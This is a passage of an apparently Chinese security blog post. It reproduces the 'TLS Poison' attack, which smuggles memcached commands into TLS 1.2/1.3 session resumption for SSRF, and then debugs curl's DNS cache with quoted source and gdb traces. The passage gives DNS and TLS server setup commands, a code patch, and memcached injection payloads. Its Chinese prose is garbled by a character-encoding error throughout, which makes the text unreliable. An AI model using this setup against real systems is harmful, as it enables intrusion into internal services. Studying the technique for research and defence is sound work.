ç¬¬ä¸€æ¬¡å»ºç«‹é“¾æ¥ï¼Œæ‹¿åˆ°æˆ‘ä»¬åˆ†é…çš„ payload åï¼Œæ–­å¼€è¿æ¥ï¼Œè®©å…¶ç¬¬äºŒæ¬¡è¿æ¥ä¸é€šè€Œå»é€‰æ‹©å¦å¤–ä¸€ä¸ª IP å‘¢ï¼Ÿ\näº‹å®è¯´æ˜ï¼Œæˆ‘ä»¬ä¹Ÿç¡®å®å¯ä»¥è¿™ä¹ˆåšã€‚åŸºäº @Ivan Komarov æä¾›çš„ DNS Server ä»¥åŠ @zhaojin ä½¿ç”¨çš„ proxy.py ï¼Œæˆ‘ä»¬å¯ä»¥æ‹‰å–æˆ‘æ•´ç†çš„ä»“åº“ https://github.com/ZeddYu/TLS-poison è¿›è¡Œå®éªŒã€‚\nè¿™é‡Œ DNS VPS çš„ setup æˆ‘ä»¬éœ€è¦ä½¿ç”¨ client-hello-poisoning/new-custom-dns/alternate-dns.py è¿›è¡Œæˆ‘ä»¬åŸŸåçš„è§£æï¼š\npython3 alternate-dns.py tls.example.com --ip x.x.x.x --mode static_zero x.x.x.x ä¸ºä½  TLS Server IP ï¼Œmode æœ‰ä¸¤ç§ï¼Œrebindingæ¨¡å¼åˆ™ä¸ºæ™®é€šçš„é‡ç»‘å®šè§£ææ¨¡å¼ï¼Œstatic_zeroåˆ™æ˜¯æˆ‘ä»¬è¿™æ¬¡æµ‹è¯•çš„åŒ A è®°å½•ã€‚\nTLS VPS çš„ setup è¿˜æ˜¯ä¸ä¹‹å‰ä¸€æ ·ï¼Œåªä¸è¿‡è¿™æ¬¡æˆ‘ä»¬éœ€è¦æŠŠ TLS Server çš„ç«¯å£ç»‘å®šåœ¨ 11210 ä¸Šï¼Œä½¿ç”¨ proxy.py å°† 11211 çš„æµé‡è½¬å‘åˆ° TLS Server ä¸Šï¼Œè€Œä¸”è¯¥è½¬å‘åªè½¬å‘ä¸€æ¬¡ï¼Œæ‰€ä»¥å¯ä»¥é€ æˆ curl ç¬¬äºŒæ¬¡è¿æ¥å¤±è´¥ï¼Œä¹Ÿå°±èƒ½è®©å…¶åˆ‡æ¢åˆ°å¦ä¸€ä¸ª IP è¿›è¡Œè¿æ¥äº†ã€‚\ntarget/debug/custom-tls -p 11210 --verbose --certs /root/tls/fullchain.pem --key /root/tls/privkey.pem http Ok. Let\u0026rsquo;s have a try.\n \nå¯ä»¥çœ‹åˆ°è¿™é‡Œ curl ä¸éœ€è¦å†ç»è¿‡å¤šæ¬¡é‡å®šå‘ï¼Œåªéœ€è¦ä¸€æ¬¡é‡å®šå‘å°±å¯ä»¥ç¨³å®šè¿›è¡Œ SSRF ï¼Œä¹Ÿä¸å†éœ€è¦ä¾é  DNS Rebinding çš„ç¨³å®šæ€§äº†ã€‚\nUse The Optimization Method To Deal With TLS 1.2 Session Ticket å°½ç®¡æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ TLS 1.3 PSK è¿›è¡Œ Session Resumption ï¼Œä½†æ˜¯æ ¹æ® https://caniuse.com/?search=tls%201.3 çš„æ•°æ®æ˜¾ç¤ºï¼Œç›®å‰ TLS 1.3 å…¨çƒè¦†ç›–ç‡ä¸º 91.12% ï¼Œè€Œ TLS 1.2 çš„è¦†ç›–ç‡ä¸º 98.4% ï¼Œå¹¶ä¸”ç›®å‰æ·˜å®ã€ç™¾åº¦ç­‰çŸ¥åä¸»ç«™å‡è¿˜æ²¡æœ‰å®Œå…¨æ”¯æŒ TLS 1.3 ï¼Œæ‰€ä»¥æœ‰äº›æ—¶å€™è¿˜æ˜¯éœ€è¦æˆ‘ä»¬ä½¿ç”¨TLS 1.2 ï¼Œè€Œä½œè€…åˆå·äº†ä¸€ç‚¹æ‡’ï¼Œæ²¡æœ‰å®ç°ä»»ä½• TLS 1.2 ç›¸å…³çš„åˆ©ç”¨æ–¹å¼ï¼Œè€Œ @zhaojin ä½¿ç”¨çš„ tlslite-ng ç›®å‰è¿˜å¹¶æœªæ”¯æŒ TLS 1.2 å½“ä¸­çš„ Session Ticket ï¼Œè€Œåˆæ­£å¥½ä½œè€…ä¿®æ”¹çš„ rustls å®ç°çš„åŠŸèƒ½æ¯”è¾ƒå®Œå–„ï¼Œæ‰€ä»¥æˆ‘åªèƒ½ç¡¬å¤´çš®åˆšäº†ä¸€æ³¢ rust ï¼Œä¸ºåŸä½œè€…çš„ TLSServer å¢åŠ äº†åŸºäº TLS 1.2 Session Ticket çš„ä¿®æ”¹åŠŸèƒ½ã€‚\nä¾æ—§ä½¿ç”¨æˆ‘ä¿®æ”¹çš„ä»“åº“ https://github.com/ZeddYu/TLS-poison ï¼Œå¯¹äº DNS Server setup è¿˜æ˜¯ä½¿ç”¨ä¼˜åŒ–çš„åŒ A è®°å½•çš„æ–¹æ³•ï¼Œä½†æ˜¯å¯¹äº TLS Server setup æˆ‘ä»¬éœ€è¦æ”¹å˜ä¸€ä¸‹ï¼š\ntarget/debug/custom-tls -p 11210 --verbose --certs /root/tls/fullchain.pem --key /root/tls/privkey.pem --tickets --protover 1.2 http ä½¿ç”¨å‚æ•°--ticketsï¼Œå…è®¸ TLS Server ä½¿ç”¨ Session Tickets è¿›è¡Œ Session Resumption ï¼›ä½¿ç”¨--protover 1.2å‚æ•°ï¼Œåªå…è®¸ TLS Server æœ€é«˜ä½¿ç”¨ TLS 1.2 ç‰ˆæœ¬ã€‚å¹¶åœ¨ redis è®¾ç½® ticket_payload ï¼Œè¿™ä¸ªä¸ä¹‹å‰è®¾ç½®çš„ payload å€¼ä¸€æ ·ï¼Œæ˜¯ç”¨æ¥å¯¹ memcached è¿›è¡Œåˆ©ç”¨çš„ï¼Œæˆ‘ä»¬è¿™é‡Œå°±åŒºåˆ«äºä¹‹å‰éšä¾¿è®¾ç½®ä¸€ä¸‹å°±å¯ä»¥äº†ï¼Œä¾‹å¦‚set ticket_payload \u0026quot;\\r\\nset foo 0 0 41\\nThis is a TLS 1.2 session ticket example.\\r\\n\u0026quot;\nå¯¹äº Client ï¼Œæˆ‘ä»¬ä¸èƒ½å†ä½¿ç”¨ curl ï¼Œå› ä¸ºå…¶å¹¶æ²¡æœ‰å®ç° Ticket Session æ’ä»¶\u0026hellip;æ‰€ä»¥æˆ‘é€‰ç”¨äº†è€ç‰ˆæœ¬ Chrome 70.0.3538.77 for Ubuntu è¿›è¡Œå­¦ä¹ ã€‚ï¼ˆæé†’è¿™é‡Œä¸è¦ç”¨ Firefox ï¼Œå› ä¸ºä½œè€…åœ¨ PDF ä¸­è¡¨ç¤ºè¿‡ Firefox æ²¡æœ‰è¿™ä¸ªâ€œç‰¹æ€§â€ï¼‰\nä¾æ—§åœ¨ TLS Server ä¸Šä½¿ç”¨ proxy.py ï¼Œæ¥ç€ç¡®å®šå‡†å¤‡å¥½å°±å¯ä»¥åœ¨æœ¬åœ°æ‰“å¼€ chrome è®¿é—®è‡ªå·± TLS Server çš„åœ°å€ï¼š\n \nå› ä¸º Chrome çš„ä¸€ä¸ªç‰¹æ®Šæœºåˆ¶ï¼Œä½¿ç”¨ Chrome æµ‹è¯•æˆ‘ä»¬å¹¶ä¸èƒ½åƒ curl é‚£æ ·ä¸€æ¬¡å°±èƒ½æˆåŠŸï¼Œè¿™é‡Œæˆ‘ä»¬æœ€å¥½ä½¿æŠŠ Chrome çš„ Keep local data only until you quit your browser é€‰é¡¹æ‰“å¼€ä»¥åŠè®¾ç½®æ¯æ¬¡æ‰“å¼€ Chrome æ—¶å°±æ‰“å¼€æˆ‘ä»¬çš„ TLS Server åœ°å€ï¼Œè¿™æ ·å®éªŒå°±æ¯”è¾ƒæ–¹ä¾¿äº†ï¼Œå¤šè¯•å‡ æ¬¡æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°ä¸Šå›¾è¿™ä¸ªæ•ˆæœã€‚\nUse The Optimization Method To Deal With TLS 1.2 Session ID é‚£è¦æ˜¯é‡åˆ°åªèƒ½ç”¨ curl/libcurl ï¼Œè€Œä¸” TLS 1.3 åˆä¸æ”¯æŒçš„æƒ…å†µï¼Œé‚£å°±åªèƒ½é€šè¿‡ TLS 1.2 Session ID æ¥å®ç°æˆ‘ä»¬æ³¨å…¥ payload å®ç° SSRF äº†ï¼Œæˆ‘ä»¬èƒ½åšçš„å°±æ˜¯ä½¿ç”¨åŒ A è®°å½•çš„æ–¹æ³•æ¥æé«˜æ”»å‡»ç¨³å®šæ€§ã€‚\nç”±äºä½œè€…å†™çš„ä¸æ˜¯å¾ˆå¥½ï¼Œå¹¶æ²¡æœ‰å¯¹ TLS 1.2 è¿›è¡Œé€‚é…ï¼Œè€Œæˆ‘ä¹Ÿå¹¶ä¸ç†Ÿæ‚‰ rust ï¼Œåªèƒ½å‹‰å¼ºæ‰¾åˆ°ä½œè€…ä»£ç åº“çš„é—®é¢˜ï¼Œå¤§æ¦‚å°±æ˜¯ç”±äºä½œè€…åœ¨ main.rs#730 å¾ªç¯ä¸­æ¯æ¬¡éƒ½ä½¿ç”¨äº†æ–°çš„ config ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤ºï¼š\nloop{poll.poll(\u0026amp;mutevents,None).unwrap();config=make_config(\u0026amp;args,session_id_generator.clone());tlsserv.tls_config=config;foreventinevents.iter(){matchevent.token(){LISTENER=\u0026gt;{if!tlsserv.accept(\u0026amp;mutpoll){break;}}_=\u0026gt;tlsserv.conn_event(\u0026amp;mutpoll,\u0026amp;event)}}}å¯¼è‡´äº†åœ¨ rustls/src/server/hs.rs#718 ä¸­æ¯æ¬¡æ ¹æ®client_hello.session_id.get_encoding()éƒ½å–ä¸åˆ°å­˜å‚¨çš„ Session ID\n// Perhaps resume? If we received a ticket, the sessionid // does not correspond to a real session. if!client_hello.session_id.is_empty()\u0026amp;\u0026amp;!ticket_received{letmaybe_resume=sess.config.session_storage.get(\u0026amp;client_hello.session_id.get_encoding()).and_then(|x|persist::ServerSessionValue::read_bytes(\u0026amp;x));ifcan_resume(sess,\u0026amp;self.handshake,\u0026amp;maybe_resume){returnself.start_resumption(sess,client_hello,sni.as_ref(),\u0026amp;client_hello.session_id,maybe_resume.unwrap());}}æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æŠŠ main.rs#734 ä»¥ä¸‹ä¸¤è¡Œè¿›è¡Œæ³¨é‡Šå³å¯ï¼š\n// config = make_config(\u0026amp;args, session_id_generator.clone()); // tlsserv.tls_config = config; è™½ç„¶å¯ä»¥ debug æ‰¾åˆ°é—®é¢˜æ‰€åœ¨ï¼Œä½†æ˜¯å¹¶ä¸èƒ½å®Œç¾åœ°ä¿®æ­£è¿™ä¸ªé—®é¢˜ï¼Œåªèƒ½åšä¸ªä¸´æ—¶çš„å¤„ç†åŠæ³•æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè€Œä¸”è‡ªå·±æ—¶é—´ç²¾åŠ›å¹¶ä¸å¤ªè¶³å¤Ÿï¼Œæ‰€ä»¥å¦‚æœæœ‰åŒå­¦æœ‰æ¯”è¾ƒå¥½çš„åŠæ³•è§£å†³è¿™ä¸ªé—®é¢˜æ¬¢è¿æ PR ä¿®æ­£è¿™ä¸ªé—®é¢˜ï¼\nç„¶ååœ¨ redis ä¸­ä¿®æ”¹ payload ä¸º 32 å­—èŠ‚é•¿åº¦ï¼šset payload \u0026quot;\\r\\nset foo 0 0 13\\nI am so poor.\\r\\n\u0026quot;ã€‚å¥½äº†ï¼Œé‚£å°±è®©æˆ‘ä»¬æ¥è¯•ä¸€ä¸‹å§ï¼\n \nè™½ç„¶æˆ‘ä»¬åªèƒ½ä½¿ç”¨ 32 å­—èŠ‚çš„ Session ID ï¼Œä½†æ˜¯å¯¹äº memcahed ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨appendå‘½ä»¤è¿›è¡Œè¿½åŠ ï¼Œä¾‹å¦‚ï¼šset payload \u0026quot;\\nappend foo 0 0 11\\nSo so poor.\\r\\n\u0026quot;ã€‚å¹¶ä¸”å› ä¸ºæˆ‘ä»¬æ³¨é‡Šäº†é‚£ä¸¤è¡Œï¼Œæ‰€ä»¥å¯¹äºé‡æ–°è®¾ç½®äº†çš„ payload ï¼Œæˆ‘ä»¬éœ€è¦é‡æ–°å¯åŠ¨ä¸€æ¬¡ TLS Server\n \nå¥½äº†ï¼Œä»¥ä¸Šå°±æ˜¯æˆ‘ä»¬å…³äº TLS Poison æ¼æ´å¤ç°çš„éƒ¨åˆ†ã€‚\nAttack Impact åœ¨ä½œè€…çš„æŠ¥å‘Šä¸­æŒ‡å‡ºå¦‚ä¸‹çš„ Client å¯¹ TLS ä¼šè¯è¿›è¡Œäº†ç¼“å­˜ï¼š\n \nä½œè€…è¿˜ç»™å‡ºäº†åœ¨å†…ç½‘ä¸­æ˜“å—æ”»å‡»çš„æœåŠ¡ï¼š\n \nMore Than TLS Poison æ¥ä¸‹æ¥å°±æ˜¯åœ¨å¤ç°ã€æ¢ç´¢ TLS Poison æ”»å‡»é‡åˆ°çš„ä¸€äº›é—®é¢˜ä»¥åŠç›¸åº”çš„æ¢ç´¢ï¼Œæˆ‘è§‰å¾—å…¶ä¸­æœ‰ä¸€äº›ä¼šæ¯”æ”»å‡»æœ¬èº«æ›´å€¼å¾—æ¢ç©¶ã€‚\ncURL DNS Cache å…³äº curl å­˜åœ¨ DNS ç¼“å­˜çš„é—®é¢˜ï¼Œå½“æ—¶å¤ç°çš„æ—¶å€™ï¼Œå³ä½¿æˆ‘ä»¬å·²ç»è®¾ç½®äº† DNS è®°å½• TTL ä¸º 0 ï¼Œ curl ä¹Ÿä¼šæœ‰ä¸€å®šæ—¶é—´çš„ç¼“å­˜ï¼Œè¿™è®©æˆ‘å½“æ—¶æ„Ÿåˆ°éå¸¸è¯§å¼‚ï¼Œç‰¹åˆ«æƒ³äº†è§£ curl å¯¹äº DNS ç¼“å­˜çš„å¤„ç†ã€‚\näºæ˜¯ä¹ï¼Œç›´æ¥ build äº†å½“æ—¶æœ€æ–°çš„ curl 7.75.0 ï¼ŒæŠ„èµ· gdb å°±å¼€å§‹ä¸€é¡¿ debug ï¼Œä¸€å¼€å§‹æˆ‘è·Ÿä¸€ä½ C è¯­è¨€å®¡è®¡å¸¦å¸ˆè°ƒçš„æ—¶å€™è§‰å¾— curl çš„ä»£ç åº”è¯¥ä¼šæ¯”è¾ƒç®€å•\u0026hellip;å¯è°çŸ¥å¼„èµ·æ¥è¿˜æ¯”è¾ƒéº»çƒ¦ï¼Œå°¤å…¶æ˜¯å¯¹äºæˆ‘è¿™ç§ä¸æ˜¯ç‰¹åˆ«ç†Ÿæ‚‰ C è¯­è¨€çš„ Web é€‰æ‰‹æ¥è¯´ï¼Œè°ƒè¯•å‘è¿˜æ˜¯æŒºå¤šçš„ï¼Œå°¤å…¶ curl è¿˜ä½¿ç”¨äº†å¤šçº¿ç¨‹å¤„ç†\u0026hellip;æˆ‘åœ¨è°ƒè¯•çš„æ—¶å€™è¿˜æ˜¯ç›¸å½“æ‡µé€¼çš„ï¼ŒæœŸé—´ä¹Ÿè®©æˆ‘å­¦ä¹ åˆ°äº†å¾ˆå¤šè°ƒè¯•å°æŠ€å·§ã€‚\ncurl åœ¨ lib/hostip.c#575 å½“ä¸­ä¼šè°ƒç”¨Curl_resolvå‡½æ•°ï¼Œå…¶ä¸­åˆä¼šè°ƒç”¨Curl_getaddrinfoå‡½æ•°å¯åŠ¨ä¸€ä¸ªæ–°çº¿ç¨‹å»æŸ¥è¯¢ DNS ï¼Œå…¶ä¸­ä¸»è¦ä½¿ç”¨äº†Curl_getaddrinfo_exå°è£…äº†getaddrinfoè¿™ä¸ª libc å‡½æ•°ï¼Œå¾—åˆ°çš„ç»“æœä¼šä½¿ç”¨Curl_cache_addrè¿›è¡Œç¼“å­˜ï¼Œè€Œè¿›è¡Œç¼“å­˜ä¸»è¦æ“ä½œå°±æ˜¯ curl è‡ªå·±ç»´æŠ¤äº†ä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œç¬¬ä¸€æ¬¡æŸ¥è¯¢å¾—åˆ°ç»“æœå°±ä¼šä½¿ç”¨Curl_cache_addræ”¾å…¥å“ˆå¸Œè¡¨å½“ä¸­ï¼Œä¸»è¦å‡½æ•°å®ç°å¦‚ä¸‹ï¼š\n/* * Curl_cache_addr() stores a \u0026#39;Curl_addrinfo\u0026#39; struct in the DNS cache. * * When calling Curl_resolv() has resulted in a response with a returned * address, we call this function to store the information in the dns * cache etc * * Returns the Curl_dns_entry entry pointer or NULL if the storage failed. */ struct Curl_dns_entry * Curl_cache_addr(struct Curl_easy *data, struct Curl_addrinfo *addr, const char *hostname, int port) { char entry_id[MAX_HOSTCACHE_LEN]; size_t entry_len; struct Curl_dns_entry *dns; struct Curl_dns_entry *dns2; #ifndef CURL_DISABLE_SHUFFLE_DNS  /* shuffle addresses if requested */ if(data-\u0026gt;set.dns_shuffle_addresses) { CURLcode result = Curl_shuffle_addr(data, \u0026amp;addr); if(result) return NULL; } #endif  /* Create a new cache entry */ dns = calloc(1, sizeof(struct Curl_dns_entry)); if(!dns) { return NULL; } /* Create an entry id, based upon the hostname and port */ create_hostcache_id(hostname, port, entry_id, sizeof(entry_id)); entry_len = strlen(entry_id); dns-\u0026gt;inuse = 1; /* the cache has the first reference */ dns-\u0026gt;addr = addr; /* this is the address(es) */ time(\u0026amp;dns-\u0026gt;timestamp); if(dns-\u0026gt;timestamp == 0) dns-\u0026gt;timestamp = 1; /* zero indicates permanent CURLOPT_RESOLVE entry */ /* Store the resolved data in our DNS cache. */ dns2 = Curl_hash_add(data-\u0026gt;dns.hostcache, entry_id, entry_len + 1, (void *)dns); if(!dns2) { free(dns); return NULL; } dns = dns2; dns-\u0026gt;inuse++; /* mark entry as in-use */ return dns; } å…¶ä¸­ä¼šä½¿ç”¨dns-\u0026gt;inuseå˜é‡èµ·åˆ°ä¸€ä¸ªå¼•ç”¨è®¡æ•°çš„ä½œç”¨ï¼Œåœ¨ç»è¿‡ç¬¬ä¸€æ¬¡æŸ¥è¯¢å¾—åˆ° DNS è®°å½•ä¹‹åï¼Œå†è¿›è¡Œ DNS æŸ¥è¯¢æ—¶ï¼Œ curl ä¼šä¼˜å…ˆåœ¨è‡ªå·±çš„å“ˆå¸Œè¡¨ä¸­æŸ¥è¯¢ï¼Œå¦‚æœæŸ¥åˆ°äº†åˆ™åˆä¼šç»´æŠ¤dns-\u0026gt;inuseå°†å…¶åŠ ä¸€ã€‚\n/* * Curl_resolv_unlock() unlocks the given cached DNS entry. When this has been * made, the struct may be destroyed due to pruning. It is important that only * one unlock is made for each Curl_resolv() call. * * May be called with \u0026#39;data\u0026#39; == NULL for global cache. */ void Curl_resolv_unlock(struct Curl_easy *data, struct Curl_dns_entry *dns) { if(data \u0026amp;\u0026amp; data-\u0026gt;share) Curl_share_lock(data, CURL_LOCK_DATA_DNS, CURL_LOCK_ACCESS_SINGLE); freednsentry(dns); if(data \u0026amp;\u0026amp; data-\u0026gt;share) Curl_share_unlock(data, CURL_LOCK_DATA_DNS); } /* * File-internal: release cache dns entry reference, free if inuse drops to 0 */ static void freednsentry(void *freethis) { struct Curl_dns_entry *dns = (struct Curl_dns_entry *) freethis; DEBUGASSERT(dns \u0026amp;\u0026amp; (dns-\u0026gt;inuse\u0026gt;0)); dns-\u0026gt;inuse--; if(dns-\u0026gt;inuse == 0) { Curl_freeaddrinfo(dns-\u0026gt;addr); free(dns); } } é€šè¿‡Curl_resolv_unlockå‡½æ•°åœ¨æ¯æ¬¡é€šä¿¡ç»“æŸåè°ƒç”¨freednsentryå°†dns-\u0026gt;inuseå‡ä¸€ï¼Œä½†æ˜¯æ­¤æ—¶ç»“æŸä¹‹ådns-\u0026gt;inuseçš„å€¼ä»ä¸º 1 ï¼Œæ‰€ä»¥ä¸‹æ¬¡è¿›è¡Œ DNS æŸ¥è¯¢çš„æ—¶å€™è¿˜ä¼šä½¿ç”¨ hash é‡Œçš„ DNS è®°å½•ï¼Œæ­¤æ—¶çš„è°ƒç”¨æ ˆå¦‚ä¸‹æ‰€ç¤ºï¼ˆæˆ‘ä»¬è¿™é‡Œç§°ä¸ºè°ƒç”¨æ ˆ A ï¼‰ï¼š\n#0 freednsentry (freethis=0x5555555d8728) at hostip.c:838 #1 0x00007ffff7f0b20e in Curl_resolv_unlock (data=0x5555555d8728, dns=0x5555555d1d38) at hostip.c:828 #2 0x00007ffff7f2720e in multi_done (data=0x5555555d8728, status=CURLE_OK, premature=false) at multi.c:620 #3 0x00007ffff7f2a902 in multi_runsingle (multi=0x5555555d4d18, nowp=0x7fffffffdae0, data=0x5555555d8728) at multi.c:2227 #4 0x00007ffff7f2af09 in curl_multi_perform (multi=0x5555555d4d18, running_handles=0x7fffffffdbd0) at multi.c:2412 #5 0x00007ffff7ef75fb in easy_transfer (multi=0x5555555d4d18) at easy.c:606 #6 0x00007ffff7ef7875 in easy_perform (data=0x5555555d8728, events=false) at easy.c:696 #7 0x00007ffff7ef78e0 in curl_easy_perform (data=0x5555555d8728) at easy.c:715 #8 0x000055555557abb9 in serial_transfers (global=0x7fffffffde20, share=0x5555555d26d8) at tool_operate.c:2326 #9 0x000055555557b099 in run_all_transfers (global=0x7fffffffde20, share=0x5555555d26d8, result=CURLE_OK) at tool_operate.c:2504 #10 0x000055555557b3d9 in operate (global=0x7fffffffde20, argc=3, argv=0x7fffffffdf98) at tool_operate.c:2620 #11 0x0000555555570991 in main (argc=3, argv=0x7fffffffdf98) at tool_main.c:277 å¹¶ä¸”æˆ‘ä»¬ä¹Ÿæ³¨æ„åˆ°åªæœ‰å½“dns-\u0026gt;inuseä¸º 0 çš„æ—¶å€™ï¼Œ curl æ‰ä¼šå°†dns-\u0026gt;addré‡Šæ”¾æ‰ï¼Œæ‰€ä»¥å¯¹äºæˆ‘ä»¬æ¥è¯´ï¼Œéœ€è¦å…³æ³¨ä»€ä¹ˆæ—¶å€™æ‰èƒ½è®©dns-\u0026gt;inuseä¸º 0 ï¼Œä¹Ÿå°±æ˜¯è¯´ä»€ä¹ˆæ—¶å€™ curl ä¼šæ‰§è¡Œä¸¤æ¬¡freednsentry å‡½æ•°å°†å…¶å‡å°‘åˆ°äº† 0 ã€‚ï¼ˆå› ä¸º curl å½“ä¸­åªæœ‰freednsentryå‡½æ•°å¯¹dns-\u0026gt;inuseè¿›è¡Œäº†å‡ä¸€æ“ä½œï¼‰\nç»è¿‡è°ƒè¯•ï¼Œå‘ç° curl åœ¨ç»è¿‡ä¸Šé¢çš„è°ƒç”¨æ ˆåï¼Œå†æ¬¡ç»è¿‡ä¸‹é¢çš„è°ƒç”¨æ ˆï¼ˆæˆ‘ä»¬è¿™é‡Œç§°ä¸ºè°ƒç”¨æ ˆ B ï¼‰ä¼šå†æ¬¡è°ƒç”¨freednsentryå‡½æ•°å°†dns-\u0026gt;inuseå‡å°‘åˆ° 0 ã€‚\n#0 freednsentry (freethis=0x5555556bab48) at hostip.c:838 #1 0x00007ffff7f08c9f in hash_element_dtor (user=0x5555555d2758, element=0x5555555d2b48) at hash.c:41 #2 0x00007ffff7f1d4a5 in Curl_llist_remove (list=0x5555555d19e8, e=0x5555555d2b48, user=0x5555555d2758) at llist.c:130 #3 0x00007ffff7f09283 in Curl_hash_clean_with_criterium (h=0x5555555d2758, user=0x7fffffffd830, comp=0x7ffff7f0a3e9 \u0026lt;hostcache_timestamp_remove\u0026gt;) at hash.c:249 #4 0x00007ffff7f0a494 in hostcache_prune (hostcache=0x5555555d2758, cache_timeout=60, now=1615184672) at hostip.c:217 #5 0x00007ffff7f0a546 in Curl_hostcache_prune (data=0x5555555d8728) at hostip.c:241 #6 0x00007ffff7f2722c in multi_done (data=0x5555555d8728, status=CURLE_OK, premature=false) at multi.c:623 #7 0x00007ffff7f2a902 in multi_runsingle (multi=0x5555555d4d18, nowp=0x7fffffffdae0, data=0x5555555d8728) at multi.c:2227 #8 0x00007ffff7f2af09 in curl_multi_perform (multi=0x5555555d4d18, running_handles=0x7fffffffdbd0) at multi.c:2412 #9 0x00007ffff7ef75fb in easy_transfer (multi=0x5555555d4d18) at easy.c:606 #10 0x00007ffff7ef7875 in easy_perform (data=0x5555555d8728, events=false) at easy.c:696 #11 0x00007ffff7ef78e0 in curl_easy_perform (data=0x5555555d8728) at easy.c:715 #12 0x000055555557abb9 in serial_transfers (global=0x7fffffffde20, share=0x5555555d26d8) at tool_operate.c:2326 #13 0x000055555557b099 in run_all_transfers (global=0x7fffffffde20, share=0x5555555d26d8, result=CURLE_OK) at tool_operate.c:2504 #14 0x000055555557b3d9 in operate (global=0x7fffffffde20, argc=3, argv=0x7fffffffdf98) at tool_operate.c:2620 #15 0x0000555555570991 in main (argc=3, argv=0x7fffffffdf98) at tool_main.c:277 è€Œè¿™ä¸¤æ¬¡è°ƒç”¨æ ˆçš„ä¸»è¦å…³ç³»åœ¨multi_doneå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ lib/multi.c#619 å¤„æ‰¾åˆ°å¦‚ä¸‹ä»£ç ï¼š\nif(conn-\u0026gt;dns_entry) { Curl_resolv_unlock(data, conn-\u0026gt;dns_entry); /* done with this */ conn-\u0026gt;dns_entry = NULL; } Curl_hostcache_prune(data); Curl_safefree(data-\u0026gt;state.ulbuf); æ‰€ä»¥è®²é“ç†çš„è¯ï¼Œåœ¨ç»è¿‡è°ƒç”¨æ ˆ A ä¹‹åï¼Œä¹Ÿå°±æ˜¯ç»è¿‡Curl_resolv_unlockå‡½æ•°å°†inuseå‡ä¸€ä¹‹åï¼Œç†è®ºä¸Šåº”è¯¥åˆä¼šç»è¿‡Curl_hostcache_pruneå‡½æ•°å°†inuseå‡ä¸€æ‰å¯¹ï¼Œä½†æ˜¯å®é™…ä¸Šå¹¶æ²¡æœ‰ã€‚è€ŒCurl_resolv_unlockå‡½æ•°æˆ‘ä»¬ä¸Šé¢çœ‹è¿‡ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆå¤šä½™çš„æ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦çœ‹ä¸€ä¸‹Curl_hostcache_pruneä¸ºä»€ä¹ˆæ²¡æœ‰å°†inuseå‡ä¸€ã€‚\n/* * Library-wide function for pruning the DNS cache. This function takes and * returns the appropriate locks. */ void Curl_hostcache_prune(struct Curl_easy *data) { time_t now; if((data-\u0026gt;set.dns_cache_timeout == -1) || !data-\u0026gt;dns.hostcache) /* cache forever means never prune, and NULL hostcache means we can\u0026#39;t do it */ return; if(data-\u0026gt;share) Curl_share_lock(data, CURL_LOCK_DATA_DNS, CURL_LOCK_ACCESS_SINGLE); time(\u0026amp;now); /* Remove outdated and unused entries from the hostcache */ hostcache_prune(data-\u0026gt;dns.hostcache, data-\u0026gt;set.dns_cache_timeout, now); if(data-\u0026gt;share) Curl_share_unlock(data, CURL_LOCK_DATA_DNS); } å¥½äº†ï¼Œçœ‹åˆ°time_t nowå°±å·®ä¸å¤šçŒœåˆ°å¤§æ¦‚äº†ï¼Œæ‰€ä»¥æŒ‰ç…§ä¹‹å‰çš„ç°è±¡ï¼ŒCurl_hostcache_pruneå‡½æ•°æ²¡æœ‰å°†inuseå‡ä¸€ï¼Œå¯èƒ½æ˜¯åœ¨ç¬¬ä¸€ä¸ªåˆ¤æ–­è¯­å¥å°±ç›´æ¥è¿”å›äº†ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬å…ˆæ£€æŸ¥ç¬¬ä¸€ä¸ªæ¡ä»¶è¯­å¥å½“ä¸­çš„æ¡ä»¶ã€‚\nç¬¬ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„å‚æ•°data-\u0026gt;set.dns_cache_timeoutï¼Œåœ¨ curl æºç å½“ä¸­å”¯äºŒå¯¹å…¶è¿›è¡Œèµ‹å€¼æ“ä½œçš„åœ°æ–¹åœ¨ lib/setopt.c#173 :\ncase CURLOPT_DNS_CACHE_TIMEOUT: arg = va_arg(param, long); if(arg \u0026lt; -1) return CURLE_BAD_FUNCTION_ARGUMENT; data-\u0026gt;set.dns_cache_timeout = arg; break; æ ¹æ®æ–‡ä»¶åä»¥åŠä¸Šä¸‹æ–‡ï¼Œæˆ‘ä»¬ä¸éš¾æŸ¥åˆ°è¿™æ˜¯å¯¹äºç”¨æˆ·ä¼ å…¥çš„å‚æ•°è¿›è¡Œçš„é…ç½® CURLOPT_DNS_CACHE_TIMEOUT explained ï¼Œå¹¶ä¸æ˜¯æˆ‘ä»¬éœ€è¦çš„ã€‚è¿˜æœ‰ä¸€å¤„èµ‹å€¼è¯­å¥åˆ™æ˜¯åœ¨ lib/url.c#511 å¤„ï¼Œåœ¨ç»“æ„ä½“å½“ä¸­å¯¹å…¶è¿›è¡Œäº†èµ‹å€¼ã€‚\nset-\u0026gt;dns_cache_timeout = 60; /* Timeout every 60 seconds by default */ å¹¶ä¸”æˆ‘ä»¬è¿™é‡Œè¿˜èƒ½ä»æ³¨é‡Šä¸­è·å¾—ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸æ˜¯ç”¨æˆ·è‡ªå®šä¹‰å‚æ•°èµ‹å€¼ï¼Œé»˜è®¤ DNS ç¼“å­˜æ—¶é—´ä¸º 60s 